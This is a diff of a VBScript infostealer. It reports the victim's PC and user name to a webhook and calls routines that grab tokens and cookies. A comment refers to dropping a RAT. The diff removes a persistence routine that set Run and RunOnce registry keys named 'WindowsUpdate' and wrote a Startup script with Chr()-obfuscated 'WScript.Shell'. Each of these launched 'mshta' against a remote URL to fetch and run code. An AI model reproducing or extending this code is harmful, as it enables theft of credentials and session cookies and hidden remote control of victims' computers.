@@ -22,7 +22,6 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
-Call Persistence
 Call PostCookieOnly(WH)
 
 ' --- 2. DROP RAT LAST (init) ---
@@ -168,19 +167,6 @@ Sub SleepSeconds(s)
             If (t2 - t1) >= (s - elapsed) Then Exit Do
         Loop
     End If
-End Sub
-
-' --- Persistence ---
-Sub Persistence()
-    Dim payload : payload = "mshta https://dicerigx.app/"
-    On Error Resume Next
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
-    sf.Close
-    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
 ' --- GrabTokens ---
